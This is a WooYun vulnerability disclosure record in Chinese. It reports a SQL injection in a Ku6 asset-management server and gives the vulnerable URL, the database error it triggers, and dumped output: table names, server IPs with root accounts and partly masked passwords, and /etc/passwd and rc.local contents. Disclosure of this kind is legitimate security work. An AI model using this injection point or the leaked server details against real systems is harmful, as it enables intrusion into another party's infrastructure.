{"id": 48292, "wybug_id": "wooyun-2014-088881", "wybug_title": "酷6网某核心服务器存在SQL注射漏洞(root权限可读写文件)", "wybug_corp": "酷6网", "wybug_author": "路人甲", "wybug_date": "2014-12-27 02:15", "wybug_open_date": "2015-01-01 02:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 酷6网某核心服务器存在SQL注射漏洞，进一步利用可摧毁机房 详细说明：  \nhttp://fixedassets.ku6.cn/req_sub_business_list.php?business_id=1'Query failed:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' order by sub_business_id' at line 1\n\nDatabase: itil[91 tables]+-------------------------------+| CDN_storage_config            || cdn_fixed_collection          || fixed_cdn_count_by_excel      || m5_server                     || maintenance_info              || malfunction_report            || monitor_item_report           || monitor_report                || portscan                      || portscanext                   || report_center                 || tb_business                   || tb_cdn_config                 || tb_cdn_push_speed             || tb_cdn_storage                || tb_cdn_storage_back           || tb_cdnid_usage                || tb_cdnid_usage_0101           || tb_cdnid_usage_history        || tb_change_history             || tb_company                    || tb_contract                   || tb_contract_ext               || tb_delnode_flow               || tb_delnode_flow_step          || tb_delnode_step_user          || tb_department                 || tb_district                   || tb_fixed_appliances           || tb_fixed_applicant            || tb_fixed_cabinet              || tb_fixed_chair                || tb_fixed_change_log           || tb_fixed_data                 || tb_fixed_disk                 || tb_fixed_fax                  || tb_fixed_firewall             || tb_fixed_furniture            || tb_fixed_info                 || tb_fixed_it_other_equipment   || tb_fixed_log                  || tb_fixed_mobile               || tb_fixed_monitor              || tb_fixed_new_studio_equipment || tb_fixed_note                 || tb_fixed_other                || tb_fixed_pc                   || tb_fixed_printer              || tb_fixed_projector            || tb_fixed_recording            || tb_fixed_server               || tb_fixed_storage              || tb_fixed_supplier             || tb_fixed_switch               || tb_fixed_table                || tb_idc                        || tb_isp                        || tb_link                       || tb_link_20090326              || tb_log                        || tb_newnode_flow               || tb_newnode_flow_step          || tb_newnode_router             || tb_newnode_server             || tb_newnode_step_user          || tb_os_type                    || tb_person                     || tb_privilege                  || tb_process                    || tb_province                   || tb_router                     || tb_s_base                     || tb_s_base_0401                || tb_s_hardware                 || tb_s_password                 || tb_s_port                     || tb_s_process                  || tb_s_software                 || tb_second_party               || tb_server_log                 || tb_sub_business               || tb_team                       || tb_tmp                        || tb_user                       || tb_user_tpl                   || view_cdn_server_link          || view_cdn_storage              || view_contract                 || view_idc                      || view_link_disc                || view_server                   |+-------------------------------+\n\n[06:34:32] [INFO] analyzing table dump for possible password hashesDatabase: itilTable: tb_newnode_server[65 entries]+-------+---------+-----------------+------+---------+---------+--------------+----------+| id    | ip2     | ip1             | user | port2   | port1   | passwd       | server_u |+-------+---------+-----------------+------+---------+---------+--------------+----------+| 10000 | <blank> | 120.193.9.34    | root | <blank> | G0/5    | ku*******.com | 1U       || 10000 | <blank> | 120.193.9.35    | root | <blank> | G0/6    | ku*******.com | 1U       || 10000 | <blank> | 120.193.9.36    | root | <blank> | G0/7    | ku*******.com | 1U       || 10000 | <blank> | 120.193.9.37    | root | <blank> | G0/8    | ku*******.com | 1U       || 10000 | <blank> | 120.193.9.38    | root | <blank> | G0/9    | ku*******.com | 2U       || 10000 | <blank> | 120.193.9.39    | root | <blank> | G0/1    | ku*******.com | 2U       || 10000 | <blank> | 120.193.9.40    | root | <blank> | G0/2    | ku*******.com | 2U       || 10000 | <blank> | 120.193.9.41    | root | <blank> | G0/3    | ku*******.com | 2U       || 10000 | <blank> | 120.193.9.42    | root | <blank> | G0/4    | ku*******.com | 2U\n   漏洞证明：  readfile: /etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:499:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinrd:x:500:500::/home/rd:/bin/bashop:x:501:501::/home/op:/bin/bashcdnscan:x:0:0::/home/cdnscan:/bin/bashmysql:x:502:503::/home/mysql:/sbin/nologinwww:x:503:504::/home/www:/sbin/nologin\nreadfile: /etc/rc.local\n#!/bin/sh## This script will be executed *after* all the other init scripts.# You can put your own initialization stuff in here if you don't# want to do the full Sys V style init stuff.route add -net 10.11.0.0/16 gw 10.11.45.1touch /var/lock/subsys/local\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-01 02:16 厂商回复：  漏洞Rank：12  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-27 02:50 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  坐等忽略....ku6被卖来卖去已经没人维护了    \n     2015-01-01 08:33 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  猪猪侠的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}